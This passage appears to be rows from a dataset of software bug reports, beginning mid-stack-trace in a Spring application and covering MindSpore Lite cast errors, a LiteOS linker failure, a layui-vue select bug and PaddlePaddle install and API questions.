[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:708) [spring-aop-5.3.19.jar:5.3.19] at com.pig4cloud.pigx.act.controller.ProcessController$$EnhancerBySpringCGLIB$$e8bdbd1b.deleteProcIns(&lt;generated&gt;) [classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_332] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_332] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_332] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_332] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) [spring-web-5.3.19.jar:5.3.19] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) [spring-web-5.3.19.jar:5.3.19] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) [spring-webmvc-5.3.19.jar:5.3.19] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) [spring-webmvc-5.3.19.jar:5.3.19] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) [spring-webmvc-5.3.19.jar:5.3.19] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) [spring-webmvc-5.3.19.jar:5.3.19] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) [spring-webmvc-5.3.19.jar:5.3.19] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) [spring-webmvc-5.3.19.jar:5.3.19] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.3.19.jar:5.3.19] at org.springframework.web.servlet.FrameworkServlet.doDelete(FrameworkServlet.java:931) [spring-webmvc-5.3.19.jar:5.3.19] at javax.servlet.http.HttpServlet.service(HttpServlet.java:671) [javax.servlet-api-4.0.1.jar:4.0.1] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.3.19.jar:5.3.19] at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) [javax.servlet-api-4.0.1.jar:4.0.1] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:122) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:116) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:109) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) [spring-security-oauth2-2.3.6.RELEASE.jar:na] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.19.jar:5.3.19] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.19.jar:5.3.19] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183) [spring-security-web-5.6.3.jar:5.6.3] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:354) [spring-web-5.3.19.jar:5.3.19] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:267) [spring-web-5.3.19.jar:5.3.19] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) [spring-web-5.3.19.jar:5.3.19] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.19.jar:5.3.19] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) [spring-web-5.3.19.jar:5.3.19] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.19.jar:5.3.19] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96) [spring-boot-actuator-2.6.7.jar:2.6.7] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.19.jar:5.3.19] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at com.pig4cloud.pigx.common.data.tenant.TenantContextHolderFilter.doFilter(TenantContextHolderFilter.java:65) [classes/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.3.19.jar:5.3.19] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:117) [spring-web-5.3.19.jar:5.3.19] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:275) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:79) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:134) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:131) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:255) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:79) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:100) [undertow-servlet-2.2.17.Final.jar:2.2.17.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:852) [undertow-core-2.2.17.Final.jar:2.2.17.Final] at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) [jboss-threads-3.1.0.Final.jar:3.1.0.Final] at org.xnio.XnioWorker$WorkerThreadFactory$1$1.run(XnioWorker.java:1280) [xnio-api-3.8.6.Final.jar:3.8.6.Final] at java.lang.Thread.run(Thread.java:750) [na:1.8.0_332]
"[MS][LITE][master][op] CastToOthers,  Unsupported datatype from 43 to 30",": /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: 1. 云侧导出控制流的mindir模型 2. 将mindir模型转换为ms模型 3. 将ms模型推送到手机，执行一下命令 ./benchmark --modelFile=Control2If2Addn2AddnOneAddn.ms ./benchmark --modelFile=Control2If3Addn3AddnOneAddn.ms ./benchmark --modelFile=Control2IfIf3Addn3AddnOneAddn.ms ./benchmark --modelFile=Control3If2Addn2Addn.ms ./benchmark --modelFile=Control3IfIf2Addn2Addn.ms ./benchmark --modelFile=CtrlWhile2ElifBInIfElif.ms 模型见附件 09-18 09:54:43.588 13317 13317 W MS_LITE : [mindspore/lite/tools/benchmark/benchmark.cc:830] CheckInputNames] The benchmark input names is not set. 09-18 09:54:44.314 13317 13318 E MS_LITE : [mindspore/lite/src/runtime/kernel/arm/fp32/cast_fp32.cc:144] CastToOthers] Unsupported datatype from 43 to 30 09-18 09:54:44.314 13317 13318 E MS_LITE : [mindspore/lite/src/inner_kernel.cc:99] Execute] run kernel failed, name: Default/Cast-op48133 09-18 09:54:44.314 13317 13318 E MS_LITE : [mindspore/lite/src/sub_graph_kernel.cc:234] Execute] run kernel failed, name: Default/Cast-op48133 09-18 09:54:44.314 13317 13318 E MS_LITE : [mindspore/lite/src/lite_mindrt.h:66] RunKernel] run kernel failed, name: subgraph_5_2 09-18 09:54:44.314 13317 13317 E MS_LITE : [mindspore/lite/src/mindrt_executor.cc:185] Run] MindrtRun failed 09-18 09:54:44.314 13317 13317 E MS_LITE : [mindspore/lite/src/lite_session.cc:692] RunGraph] RunGraph failed : -1 09-18 09:54:44.314 13317 13317 E MS_LITE : [mindspore/lite/tools/benchmark/benchmark.cc:281] MarkPerformance] Inference error -1 09-18 09:54:44.314 13317 13317 E MS_LITE : [mindspore/lite/tools/benchmark/benchmark.cc:521] RunBenchmark] Run MarkPerformance error: -1 09-18 09:54:44.314 13317 13317 E MS_LITE : [mindspore/lite/tools/benchmark/run_benchmark.cc:63] RunBenchmark] Run Benchmark Control2If2Addn2AddnOneAddn.ms"
【众智】【计算-GPU开发】ResizeArea,"接口目录：mindspore/ops/operations/image_ops.py images size y align_corners bool 属性 对应底层算子 Classify Name Type Type Range Required Doc Default INPUT images int8,uint8,int16,uint16,int32,int64,fp16,fp32,double TRUE 4-D的图像shape为[batch,height,width,channels] INPUT size int32 TRUE 2个元素的1-D的int32类型的tensor OUTPUT y fp32, double TRUE resize后的图像 ATTR align_corners bool FALSE 默认为false，如果为true，输入和输出张量的4个角像素的中心对齐，保留角像素处的值 FALSE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/ResizeArea 3. 异常处理 4. 算子反向 无需接入反向算子   <code>: 使用区域插值调整图像大小。 class ResizeArea(Primitive):"
realview-pbx-a9.config编译失败,编译master分支(commit: 7d526f311e6235babcaa61225b7416b1a0309be6) cp tools/build/config/realview-pbx-a9.config .config make   <code>: arm-none-eabi-ld -static --gc-sections -nostartfiles -L/mnt/work/LiteOS/tools/scripts/ld -L/mnt/work/LiteOS/targets/realview-pbx-a9 -L/mnt/work/LiteOS/out/realview-pbx-a9/lib -L/mnt/work/LiteOS/out/realview-pbx-a9/lib/obj -L/mnt/work/LiteOS/tools/build -L/opt/gcc-arm-none-eabi-9-2019-q4-major/lib/gcc/arm-none-eabi/9.2.1/ -L/opt/gcc-arm-none-eabi-9-2019-q4-major/arm-none-eabi/lib/ -T/mnt/work/LiteOS/targets/realview-pbx-a9/liteos.ld -utask_shellcmd -ucpup_shellcmd -uhelp_shellcmd -ufree_shellcmd -usem_shellcmd -umutex_shellcmd -uqueue_shellcmd -usysteminfo_shellcmd -uswtmr_shellcmd -uhwi_shellcmd -ufindsym_shellcmd -uzbar_scan_shellcmd -udmesg_shellcmd -udate_shellcmd -ureadExcInfo_shellcmd -uwatch_shellcmd -upwd_shellcmd -ucd_shellcmd -umkdir_shellcmd -uls_shellcmd -udeadlock_shellcmd -uarp_shellcmd -utelnet_shellcmd -umqttconn_shellcmd -umqttpub_shellcmd -umqttsub_shellcmd -umqttunsub_shellcmd -umqttdisconn_shellcmd -umqttquit_shellcmd -umqttstatus_shellcmd -umqttmem_shellcmd -ucipherInit_shellcmd -ucipherDeinit_shellcmd -utftp_server_shellcmd -uifconfig_shellcmd -uping_shellcmd -ucd_shellcmd -uformat_shellcmd -upartition_shellcmd -uwriteproc_shellcmd -upartinfo_shellcmd -uumount_shellcmd -umount_shellcmd -uvirstatfs_shellcmd -ulsfd_shellcmd -ufatfsck_shellcmd -udd_shellcmd -uiperf_shellcmd -ulwip_dump_shellcmd -uthttpd_shellcmd -ufastlz_shellcmd -ujerry_shellcmd -umicropython_shellcmd -uregex_shellcmd -ureset_shellcmd -ustartap_shellcmd -uhimd_shellcmd -uhiddrs_shellcmd -unand_bad_shellcmd -ui2c_read_shellcmd -ussp_read_shellcmd -uuart_config_shellcmd -uusb_debug_shellcmd -uramfs_fsmap -unfs_fsmap -ufat_fsmap -uyaffs_fsmap -ulittlefs_fsmap -uromfs_fsmap -ug_fsmap -ui2c_init -ugpio_init -uregulator_init -umtd_init_list -uhispi_init -uhifmc100_init -uhisfc350_init -unand_hifmc100_init -uhifmc100_parallel_init -usd_mci_init -uhi_mci_init -upl011_init -uhinfc620_init -uhisnfc100_init -uregulator_machine_init -uhisimeidia_regulator_init -ucpufreq_init -uhisilicon_cpufreq_init -ucpufreq_machine_init -udevfreq_init -umedia_devfreq_init -udevfreq_machine_init -uhieth_machine_init -uhigmac_machine_init -umachine_init -ujffs_fsmap -uprocfs_fsmap -ug_fsmap_wow -ui2c_init -ugpio_init -uregulator_init -umtd_init_list -uhispi_init -uhifmc100_init -uhisfc350_init -unand_hifmc100_init -uhifmc100_parallel_init -usd_mci_init -uhi_mci_init -upl011_init -uhinfc620_init -uhisnfc100_init -uregulator_machine_init -uhisimeidia_regulator_init -ucpufreq_init -uhisilicon_cpufreq_init -ucpufreq_machine_init -udevfreq_init -umedia_devfreq_init -udevfreq_machine_init -uhieth_machine_init -uhigmac_machine_init -umachine_init -ug_fsmap_scatter -ui2c_init -ugpio_init -uregulator_init -umtd_init_list -uhispi_init -uhifmc100_init -uhisfc350_init -unand_hifmc100_init -uhifmc100_parallel_init -usd_mci_init -uhi_mci_init -upl011_init -uhinfc620_init -uhisnfc100_init -uregulator_machine_init -uhisimeidia_regulator_init -ucpufreq_init -uhisilicon_cpufreq_init -ucpufreq_machine_init -udevfreq_init -umedia_devfreq_init -udevfreq_machine_init -uhieth_machine_init -uhigmac_machine_init -umachine_init -Map=/mnt/work/LiteOS/out/realview-pbx-a9/Huawei_LiteOS.map -o /mnt/work/LiteOS/out/realview-pbx-a9/Huawei_LiteOS.elf --start-group -lgcc -lcortex-a9 -lsupc++ -lstdc++ -lcortex-a9 -lbsp -lrealview-pbx-a9 -lbase -lcppsupport -linit -lsec -lc -lposix -lm -lz -lcsysdeps -linterrupt -ltimer -larm_pl011 -luart -losdepends -lshell -latiny_log -lrealview-pbx-a9 --end-group arm-none-eabi-ld: warning: /opt/gcc-arm-none-eabi-9-2019-q4-major/lib/gcc/arm-none-eabi/9.2.1//libgcc.a(_udivmoddi4.o) uses variable-size enums yet the output is to use 32-bit enums; use of enum values across objects may fail /mnt/work/LiteOS/out/realview-pbx-a9/lib/libinit.a(los_init.o): In function `OsMain': /mnt/work/LiteOS/kernel/init/los_init.c:374: undefined reference to `OsMpInit' /mnt/work/LiteOS/out/realview-pbx-a9/lib/libposix.a(pthread_mutex.o): In function `OsMuxPostForPosix': /mnt/work/LiteOS/lib/huawei_libc/pthread/pthread_mutex.c:467: undefined reference to `LOS_MpSchedule' /mnt/work/LiteOS/out/realview-pbx-a9/lib/libinterrupt.a(arm_gic_v2.o): In function `HalSmpIrqInit': /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:208: undefined reference to `OsMpWakeHandler' /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:208: undefined reference to `OsMpWakeHandler' /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:212: undefined reference to `OsMpScheduleHandler' /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:212: undefined reference to `OsMpScheduleHandler' /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:216: undefined reference to `OsMpScheduleHandler' /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:216: undefined reference to `OsMpScheduleHandler' /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:221: undefined reference to `OsMpFuncCallHandler' /mnt/work/LiteOS/drivers/interrupt/arm_gic_v2.c:221: undefined reference to `OsMpFuncCallHandler' Makefile:73: recipe for target 'Huawei_LiteOS' failed make: *** [Huawei_LiteOS] Error 1
"select 打包后无法使用, 单选选中后输入框不显示, 多选全部显示 undefined","select 打包后无法使用, 单选选中后输入框不显示, 多选全部显示 undefined 复现步骤 https://layui-vue.gitee.io/sandbox-vue/#eNrNkk1PwzAMhv+K5ctAoivdseom8TsIh9C6KChfStwKVPW/4y1M6uDAlWOe168/Yi/4FON+nghb7JhctJrppDxAZ/VnlclSzzBXLgxkjwoLoOGgENxk2URbwm8MVYhsgi8cxD6GJGbjB/qAMELzqPAqtrO2E13VDbf69VLyhp+6+leZ0u6GC/h7AoX/se+u3ixBnrlPJjJY7d8kJWf59kw8RVGNiyExLJBohBXGFBzsZJO7s7EPPrOEllnheA66a+5/Codv5bl5Ea2rSzlJjg9Y8ldOx/17Dl4OZJGhLlDaaJd1xfULpTW+5w== 下载项目 1.7.7   <code>: npm install npm run build npm run serve"
win10 2070super 安装完GPU版本后，检测安装是否完好时出错,"1）PaddlePaddle版本：paddlepaddle-gpu==1.5.1.post97 2）CPU：i7-9700kf 3）GPU：2070super，CUDA9.0, CUDNN7.6.1 4）系统环境：win10、Python3.7 安装方式信息：pip安装 问题描述：在win10上安装时参考官网，https://www.paddlepaddle.org.cn/start。报错。   <code>: &gt;&gt;&gt; paddle.fluid.install_check.run_check() Running Verify Fluid Program ... W0807 01:14:14.697468 8948 device_context.cc:259] Please NOTE: device: 0, CUDA Capability: 75, Driver API Version: 10.1, Runtime API Version: 9.0 W0807 01:14:14.705452 8948 device_context.cc:267] device: 0, cuDNN Version: 7.6. Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\install_check.py"", line 123, in run_check test_simple_exe() File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\install_check.py"", line 121, in test_simple_exe fetch_list=[out0.name, param_grads[1].name]) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\executor.py"", line 651, in run use_program_cache=use_program_cache) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\executor.py"", line 749, in _run exe.run(program.desc, scope, 0, True, True, fetch_var_name) paddle.fluid.core_avx.EnforceNotMet: Invoke operator mul error. Python Callstacks: File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\framework.py"", line 1771, in append_op attrs=kwargs.get(""attrs"", None)) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\dygraph\layer_object_helper.py"", line 52, in append_op stop_gradient=stop_gradient) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\dygraph\nn.py"", line 945, in forward ""y_num_col_dims"": 1 File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\dygraph\layers.py"", line 162, in __call__ outputs = self.forward(*inputs) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\install_check.py"", line 40, in forward x = self._fc1(inputs) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\dygraph\layers.py"", line 162, in __call__ outputs = self.forward(*inputs) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\install_check.py"", line 113, in test_simple_exe out0 = simple_layer0(inp0) File ""F:\Software\Anaconda\lib\site-packages\paddle\fluid\install_check.py"", line 123, in run_check test_simple_exe() File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; C++ Callstacks: CUBLAS: execution failed, at [D:/1.5.1/release_cuda97/paddle\paddle/fluid/operators/math/blas_impl.cu.h:34] PaddlePaddle Call Stacks: Windows not support stack backtrace yet."
Why paddle fluid layers use function instead of class?,"I notice that in paddle/fluid/layers/nn.py layers are defined as functions take fc as example: it create weights in the function. however, people may reuse weights in their model, in this case, one can not reuse the layer just call it when they want. Current, i call helper to create weights in my own class, and maintain it for further use. It's there any solutions for sharing the weights? Not very sure, but based on my understanding, If the layers is defined as classes in paddle like tensorflow or pytorch, it would be good for building the model with high level interfaces.   <code>: def fc(input, size, num_flatten_dims=1, param_attr=None, bias_attr=None, act=None, is_test=False, name=None): helper = LayerHelper(""fc"", **locals()) dtype = helper.input_dtype() mul_results = [] for input_var, param_attr in helper.iter_inputs_and_params(): input_shape = input_var.shape param_shape = [ reduce(lambda a, b: a * b, input_shape[num_flatten_dims:], 1) ] + [size] w = helper.create_parameter( attr=param_attr, shape=param_shape, dtype=dtype, is_bias=False) tmp = helper.create_variable_for_type_inference(dtype) helper.append_op( type=""mul"", inputs={""X"": input_var, ""Y"": w}, outputs={""Out"": tmp}, attrs={""x_num_col_dims"": num_flatten_dims, ""y_num_col_dims"": 1}) mul_results.append(tmp) if len(mul_results) == 1: pre_bias = mul_results[0] else: pre_bias = helper.create_variable_for_type_inference(dtype) helper.append_op( type=""sum"", inputs={""X"": mul_results}, outputs={""Out"": pre_bias}, attrs={""use_mkldnn"": False}) # add bias pre_activation = helper.append_bias_op(pre_bias, dim_start=num_flatten_dims) # add activation return helper.append_activation(pre_activation)"
